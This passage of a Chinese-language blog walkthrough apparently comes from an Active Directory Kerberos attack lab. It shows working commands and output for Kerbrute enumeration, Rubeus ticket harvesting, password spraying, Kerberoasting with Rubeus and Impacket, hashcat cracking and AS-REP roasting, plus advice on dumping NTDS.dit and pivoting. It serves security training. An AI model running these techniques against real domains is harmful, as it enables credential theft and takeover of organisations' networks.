id="服务单内容"><a href="#服务单内容" class="headerlink" title="服务单内容 -"></a>服务单内容 -</h4><p>要了解 Kerberos 身份验证的工作原理，您首先需要了解这些票证包含什么以及如何验证它们。服务票据包含两部分：服务提供部分和用户提供部分。我会把它分解成每个部分包含的内容。</p><ul><li>服务部分：用户详细信息、会话密钥、使用服务帐户 NTLM 哈希加密票证。</li><li>用户部分：有效性时间戳、会话密钥、使用 TGT 会话密钥加密。</li></ul><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/2102ff15e7476be481beb1a7e029d389.png" alt="image-20220531094824478" style="zoom:25%;" /><h4 id="Kerberos-身份验证概述"><a href="#Kerberos-身份验证概述" class="headerlink" title="Kerberos 身份验证概述 -"></a>Kerberos 身份验证概述 -</h4><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/ec06eb18c6e11e863afe6c47c937e3a9.png" alt="image-20220531094906872" style="zoom: 50%;" /><p>AS-REQ - 1.) 客户端请求身份验证票证或票证授予票证 (TGT)。</p><p>AS-REP - 2.) 密钥分发中心验证客户端并发回加密的 TGT。</p><p>TGS-REQ - 3.) 客户端将加密的 TGT 与客户端想要访问的服务的服务主体名称 (SPN) 一起发送到票证授予服务器 (TGS)。</p><p>TGS-REP - 4.) 密钥分发中心 (KDC) 验证用户的 TGT 以及用户有权访问服务，然后向客户端发送服务的有效会话密钥。</p><p>AP-REQ - 5.) 客户端请求服务并发送有效会话密钥以证明用户具有访问权限。</p><p>AP-REP - 6.) 服务授予访问权限</p><h4 id="攻击权限要求"><a href="#攻击权限要求" class="headerlink" title="攻击权限要求 -"></a>攻击权限要求 -</h4><ul><li>Kerbrute 枚举 - 无需域访问 </li><li>传递票证 - 以用户身份访问所需的域</li><li>Kerberoasting - 以任何需要的用户身份访问</li><li>AS-REP Roasting - 以任何需要的用户身份访问</li><li>Golden Ticket - 需要完整的域妥协（域管理员） </li><li>Silver Ticket - 需要服务哈希 </li><li>万能钥匙 - 需要完整的域妥协（域管理员）</li></ul><h2 id="2-Kerbrute-枚举"><a href="#2-Kerbrute-枚举" class="headerlink" title="#2 Kerbrute 枚举"></a>#2 Kerbrute 枚举</h2><p>kerbrute : <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p><p>user.txt : <a href="https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt">https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt</a></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 userenum -d <span class="module-access"><span class="module"><span class="identifier">CONTROLLER</span>.</span></span>local --dc <span class="number">10.10</span>.<span class="number">124.146</span> <span class="module-access"><span class="module"><span class="identifier">User</span>.</span></span>txt</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3445635a22c41b4ebad87ad745bfa01e.png" alt="image-20220531110137790"></p><h2 id="3-用-Rubeus-获取票据-amp-破解票据"><a href="#3-用-Rubeus-获取票据-amp-破解票据" class="headerlink" title="#3 用 Rubeus 获取票据 &amp; 破解票据"></a>#3 用 Rubeus 获取票据 &amp; 破解票据</h2><h4 id="Rubeus-获取票据"><a href="#Rubeus-获取票据" class="headerlink" title="Rubeus 获取票据"></a>Rubeus 获取票据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe harvest /interval:30    <span class="comment"># 每30秒收获一次TGT</span></span><br><span class="line"></span><br><span class="line">CONTROLLER-1 C:\Users\Administrator\Downloads&gt;Rubeus.exe harvest /interval:30</span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">  (_____ \      | |                                                                                                 </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)                                                                           </span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                               </span><br><span class="line"></span><br><span class="line">[*] Action: TGT Harvesting (with auto-renewal) </span><br><span class="line">[*] Monitoring every 30 seconds <span class="keyword">for</span> new TGTs</span><br><span class="line">[*] Displaying the working TGT cache every 30 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Refreshing TGT ticket cache (5/30/2022 7:57:25 PM)</span><br><span class="line"></span><br><span class="line">  User                  :  CONTROLLER-1<span class="variable">$@CONTROLLER</span>.LOCAL </span><br><span class="line">  StartTime             :  5/30/2022 6:26:57 PM</span><br><span class="line">  EndTime               :  5/31/2022 4:26:57 AM</span><br><span class="line">  RenewTill             :  6/6/2022 6:26:57 PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr</span><br><span class="line">    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEiufD0DYuMmQCg/dSQ7ShTy7kGSlSnmPmtzR</span><br><span class="line">    ......</span><br><span class="line">    MCmgAwIBEqEiBCAzaBGdXMlb9yAiEvd5TDxkuK8shpBpRrS93/diGlyMuKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw</span><br><span class="line">    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIyMDUzMTAxMjY1N1qmERgPMjAyMjA1MzExMTI2NTdapxEYDzIwMjIwNjA3</span><br><span class="line">    MDEyNjU3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM</span><br><span class="line"></span><br><span class="line">  User                  :  CONTROLLER-1<span class="variable">$@CONTROLLER</span>.LOCAL</span><br><span class="line">  StartTime             :  5/30/2022 6:26:57 PM</span><br><span class="line">  EndTime               :  5/31/2022 4:26:57 AM</span><br><span class="line">  RenewTill             :  6/6/2022 6:26:57 PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr</span><br><span class="line">    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEpl0EQ1mPJUIoWWPlW9vQCv5BjpYk/UdQ16F</span><br><span class="line">    ......</span><br><span class="line">    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIyMDUzMTAxMjY1N1qmERgPMjAyMjA1MzExMTI2NTdapxEYDzIwMjIwNjA3</span><br><span class="line">    MDEyNjU3WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM</span><br><span class="line"></span><br><span class="line">  User                  :  Administrator@CONTROLLER.LOCAL</span><br><span class="line">  StartTime             :  5/30/2022 7:47:33 PM</span><br><span class="line">  EndTime               :  5/31/2022 5:47:33 AM</span><br><span class="line">  RenewTill             :  6/6/2022 7:47:33 PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr</span><br><span class="line">    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGskQlYMSWETwhc7mgPsK7FDZYoVI8F4VS/pl</span><br><span class="line">......</span><br><span class="line">    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjIwNTMxMDI0NzMzWqYRGA8yMDIyMDUzMTEyNDczM1qnERgP</span><br><span class="line">    MjAyMjA2MDcwMjQ3MzNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用-Rubeus-进行暴力破解-密码喷洒"><a href="#使用-Rubeus-进行暴力破解-密码喷洒" class="headerlink" title="使用 Rubeus 进行暴力破解/密码喷洒 -"></a>使用 Rubeus 进行暴力破解/密码喷洒 -</h4><p>在使用 Rubeus 进行密码喷洒之前，您需要将域控制器域名添加到 windows 主机文件中。您可以使用 echo 命令将 IP 和域名添加到机器中的 hosts 文件中： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 10.10.124.146 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</span><br><span class="line"></span><br><span class="line">Rubeus.exe brute /password:Password1 /noticket  <span class="comment"># 这将采用给定的密码并将其喷洒给所有找到的用户，然后为该用户提供 .kirbi TGT</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">controller\administrator@CONTROLLER-<span class="number">1</span> C:\Users\Administrator\Downloads&gt;<span class="built_in">echo</span> <span class="number">10</span>.<span class="number">10</span>.<span class="number">124</span>.<span class="number">146</span> CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">controller\administrator@CONTROLLER-<span class="number">1</span> C:\Users\Administrator\Downloads&gt;Rubeus.exe brute /password:Password1 /noticket</span><br><span class="line">   ______        _  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line">  v1.<span class="number">5</span>.<span class="number">0</span></span><br><span class="line">[-] Blocked/Disabled user =&gt; Guest</span><br><span class="line">[-] Blocked/Disabled user =&gt; krbtgt[+] STUPENDOUS =&gt; Machine1:Password1</span><br><span class="line">[*] base64(Machine1.kirbi):</span><br><span class="line">      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi     </span><br><span class="line">      ......</span><br><span class="line">      GA8yMDIyMDUzMTAzMjMzNlqmERgPMjAyMjA1MzExMzIzMzZapxEYDzIwMjIwNjA3MDMyMzM2WqgSGxBD</span><br><span class="line">      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Done</span><br></pre></td></tr></table></figure><h2 id="4-用Rubeus-和-Impacket-进行-Kerberoasting"><a href="#4-用Rubeus-和-Impacket-进行-Kerberoasting" class="headerlink" title="#4 用Rubeus 和 Impacket 进行 Kerberoasting"></a>#4 用Rubeus 和 Impacket 进行 Kerberoasting</h2><h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">controller\administrator<span class="meta">@CONTROLLER-1</span> C:\Users\Administrator\Downloads&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      |<span class="string"> </span>|</span><br><span class="line">   _____) )_   _|<span class="string"> </span>|<span class="string">__  _____ _   _  ___</span></span><br><span class="line"><span class="string">  </span>|<span class="string">  __  /</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \</span>|<span class="string"> ___ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/___)</span></span><br><span class="line"><span class="string">  </span>|<span class="string"> </span>|<span class="string">  \ \</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) ) ____</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">___ </span>|</span><br><span class="line">  |<span class="string">_</span>|<span class="string">   </span>|<span class="string">_</span>|<span class="string">____/</span>|<span class="string">____/</span>|<span class="string">_____)____/(___/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  v1.5.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Kerberoasting</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NOTICE: AES hashes will be returned for AES-enabled accounts. </span></span><br><span class="line"><span class="string">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Searching the current domain for Kerberoastable users </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Total kerberoastable users : 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] SamAccountName         : SQLService</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local </span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111</span></span><br><span class="line"><span class="string">[*] PwdLastSet             : 5/25/2020 10:28:26 PM</span></span><br><span class="line"><span class="string">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span></span><br><span class="line"><span class="string">[*] Hash                   : n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] SamAccountName         : HTTPService</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222</span></span><br><span class="line"><span class="string">[*] PwdLastSet             : 5/25/2020 10:39:17 PM</span></span><br><span class="line"><span class="string">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo</span></span><br><span class="line"><span class="string">                             cal:30222*$8567C8880014354D68ACF7B9C004873B$F1EAC83F611ED876A7DB3B727430122DDC92</span></span><br><span class="line"><span class="string">                             B82C4EEA0F199640460E8B00F8E1E8115DF7F0911295008FF0E1C53C72AD1FA9E27EA71622D6D19B</span></span><br><span class="line"><span class="string">   ......</span></span><br><span class="line"><span class="string">                             00097158E360177967C7E017FFF668FD344B2F42E4D7B8BD5E190F688CA83F5AFA8E29F47B5ED488</span></span><br><span class="line"><span class="string">                             9A3995140D3FEAC5ABD25C244ABE894E3D3386AE84435FACDB8C15FC56C3</span></span><br></pre></td></tr></table></figure><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.79.10 -request                   </span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------</span><br><span class="line">CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=<span class="built_in">local</span>  2020-05-26 06:28:26.922527  2020-05-26 06:46:42.467441             </span><br><span class="line">CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 06:39:17.578393  2020-05-26 06:40:14.671872             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*SQLService<span class="variable">$CONTROLLER</span>.LOCAL<span class="variable">$controller</span>.<span class="built_in">local</span>/SQLService*$284b86804969fcad912913c995a87122<span class="variable">$9f23877d25bc8cddabd687c3aa89d878bb926db8b684ff937a4fa1a25c94989a0a1e039b8a21b29b88759ef09f43fd0edd4e2cdf688019f080945bba722138b</span>......</span><br><span class="line">d40cb5c2c9267594874f7e393763e81141370fd422624b340070cfe7e5f20bd6a9b5be125b7550055241219e6daa7fc504fa1c</span><br><span class="line">$krb5tgs$23$*HTTPService<span class="variable">$CONTROLLER</span>.LOCAL<span class="variable">$controller</span>.<span class="built_in">local</span>/HTTPService*$3760a3668088f7092337c2e826c43790<span class="variable">$75fe3fb9176fcbf3c62a8ae0630b628a7fb6b954e4dc87770128407ca83125f1836abde59017299e01ae3471c80358a5facb984ffc606f06c147202283ea30fa1f04442d9755934a87d428c760f9a3a0f228536454e9ba8f090e3107365d225603bd71b5c2f5d78efe29d5a0fe89d79bd1992b7ad6898e7a</span>......</span><br><span class="line">19b97dde84b97a95a79460bd7c41ec97791759524c91d47df3ab4350d06582a0160d9730d8bd84785eab1f51c8bff55430435548</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">13100</span> kerberoas_hash2 <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt </span><br></pre></td></tr></table></figure><h4 id="服务帐户可以做什么？"><a href="#服务帐户可以做什么？" class="headerlink" title="服务帐户可以做什么？"></a>服务帐户可以做什么？</h4><p>破解服务帐户密码后，根据服务帐户是否为域管理员，有多种方法可以窃取数据或收集战利品。如果服务帐户是域管理员，您拥有类似于金/银票的控制权，并且现在可以收集战利品，例如转储 NTDS.dit。如果服务帐户不是域管理员，您可以使用它来登录其他系统并进行旋转或升级，或者您可以使用破解的密码来攻击其他服务和域管理员帐户；许多公司可能会为其服务或域管理员用户重复使用相同或相似的密码。</p><h2 id="5-用Rubeus进行AS-REP-Roasting"><a href="#5-用Rubeus进行AS-REP-Roasting" class="headerlink" title="#5 用Rubeus进行AS-REP Roasting"></a>#5 用Rubeus进行AS-REP Roasting</h2><h4 id="Rubeus-1"><a href="#Rubeus-1" class="headerlink" title="Rubeus"></a>Rubeus</h4><p><code>Rubeus.exe asreproast</code> - 这将运行 AS-REP Roasting 命令寻找易受攻击的用户，然后转储发现的易受攻击的用户哈希。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Rubeus</span><span class="selector-class">.exe</span> <span class="selector-tag">asreproast</span></span><br><span class="line"><span class="selector-tag">controller</span>\<span class="selector-tag">administrator</span>@<span class="selector-tag">CONTROLLER-1</span> <span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">Administrator</span>\<span class="selector-tag">Downloads</span>&gt;<span class="selector-tag">Rubeus</span><span class="selector-class">.exe</span> <span class="selector-tag">asreproast</span></span><br><span class="line"></span><br><span class="line">   <span class="selector-tag">______</span>        <span class="selector-tag">_</span></span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )<span class="selector-tag">_</span>   <span class="selector-tag">_</span>| |<span class="selector-tag">__</span>  <span class="selector-tag">_____</span> <span class="selector-tag">_</span>   <span class="selector-tag">_</span>  <span class="selector-tag">___</span></span><br><span class="line">  |  <span class="selector-tag">__</span>  /| | | |  <span class="selector-tag">_</span> \| <span class="selector-tag">___</span> | | | |/<span class="selector-tag">___</span>)</span><br><span class="line">  | |  \ \| |<span class="selector-tag">_</span>| | |<span class="selector-tag">_</span>) ) <span class="selector-tag">____</span>| |<span class="selector-tag">_</span>| |<span class="selector-tag">___</span> |</span><br><span class="line">  |<span class="selector-tag">_</span>|   |<span class="selector-tag">_</span>|<span class="selector-tag">____</span>/|<span class="selector-tag">____</span>/|<span class="selector-tag">_____</span>)<span class="selector-tag">____</span>/(___/</span><br><span class="line"></span><br><span class="line">  v1.<span class="number">5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] <span class="attribute">Action</span>: AS-REP roasting</span><br><span class="line"></span><br><span class="line">[*] Target <span class="attribute">Domain          </span>: CONTROLLER.local</span><br><span class="line"></span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local&#x27;</span> for AS-REP roastable users</span><br><span class="line">[*] <span class="attribute">SamAccountName         </span>: Admin2</span><br><span class="line">[*] <span class="attribute">DistinguishedName      </span>: CN=Admin-<span class="number">2</span>,CN=Users,DC=CONTROLLER,DC=local</span><br><span class="line">[*] Using domain <span class="attribute">controller</span>: CONTROLLER-<span class="number">1</span>.CONTROLLER.local (<span class="attribute">fe80</span>::<span class="number">1017</span>:<span class="attribute">ba9c</span>:<span class="attribute">ee45</span>:<span class="number">508</span>d%<span class="number">5</span>)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) <span class="attribute">for</span>: <span class="string">&#x27;CONTROLLER.local\Admin2&#x27;</span></span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP <span class="attribute">hash</span>:</span><br><span class="line"></span><br><span class="line">      $krb5asrep$Admin2<span class="variable">@CONTROLLER</span>.<span class="attribute">local</span>:<span class="number">06</span>CDBC190707473F71CDF6CECAE5F20B$<span class="number">0</span>AD65C0ACC46</span><br><span class="line">      ED5215457CF68B1BB3FA8F6322E750A61AFB1977D1C1AB50138FA51B9907E1FB47B32241D636A8C8</span><br><span class="line">      EEF5564ED8A0F1756582CAD702F5DD776317BC1B99814AA31C9527A8AB15D47FAB6DF19F5428382A</span><br><span class="line">      A70B036C1B54BF482BB317AFD03F26C73F7214FFC3F5398250C7F928A391FCBF3EB445A4BD34409D</span><br><span class="line">      CE1241BF34BE9EC3787815978E6A52A6FBAA92061FB90434D5F6F40F75649C7F5457A48BBF146C74</span><br><span class="line">      EF2CFDC4540BD3A313BDE30E2030D10A0CE707304461C80CBEEB4EE8B7FF4B3869E1ECBEEB4B84C3</span><br><span class="line">      <span class="number">93</span>A7683056C1D880E5882B2AB56E784C97F620F0B9870105398CF8824BF25E8CC4ED5EB282D9</span><br><span class="line"></span><br><span class="line">[*] <span class="attribute">SamAccountName         </span>: User3</span><br><span class="line">[*] <span class="attribute">DistinguishedName      </span>: CN=User-<span class="number">3</span>,CN=Users,DC=CONTROLLER,DC=local</span><br><span class="line">[*] Using domain <span class="attribute">controller</span>: CONTROLLER-<span class="number">1</span>.CONTROLLER.local (<span class="attribute">fe80</span>::<span class="number">1017</span>:<span class="attribute">ba9c</span>:<span class="attribute">ee45</span>:<span class="number">508</span>d%<span class="number">5</span>)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) <span class="attribute">for</span>: <span class="string">&#x27;CONTROLLER.local\User3&#x27;</span></span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP <span class="attribute">hash</span>:</span><br><span class="line"></span><br><span class="line">      $krb5asrep$User3<span class="variable">@CONTROLLER</span>.<span class="attribute">local</span>:A2342209F120FA68D66E88C3FA1DC661$<span class="number">8225304</span>A422C8</span><br><span class="line">      <span class="number">7024</span>ACC1EBC674E2CA5A29F4DC512CD4824466F337CB9190098A881785B20C3249F2FFA45A3900E6</span><br><span class="line">      <span class="number">87150</span>A8186E9403271237B19F240A191AA176B6C832DAFC2FC04E3FA5BFCAEB44E6F850DA5FC3889</span><br><span class="line">      <span class="number">6</span>C7419101D679C382A6DE6054701BDC05AB48CE179D787D62AC23A5B13C59C897B5FF0EDC588FA67</span><br><span class="line">      <span class="number">2044</span>ABB10A91F1D537AE4D492D906FC26E9C91D4E07FE9209BB798D4B1A119611D187EFA7F4B3C51</span><br><span class="line">      BBD9EADEE8125DD703CDFB2B2BC6B9AA6F0626F2F6112A556244F8363F1ECAD69F92A464E4EAFD75</span><br><span class="line">      <span class="number">48</span>AFC9EC0F1D42331F93F4AB3FD60F4592B2AEAD5B647F3D66CCD5EF44A18A26EA72C95F6C3</span><br></pre></td></tr></table></figure><h4 id="impacket-GetNPUsers"><a href="#impacket-GetNPUsers" class="headerlink" title="impacket-GetNPUsers"></a>impacket-GetNPUsers</h4><ol><li>先用kerbrute枚举用户名。</li><li>再用impacket-GetNPUsers对已存在用户进行AS-REP Roasting </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 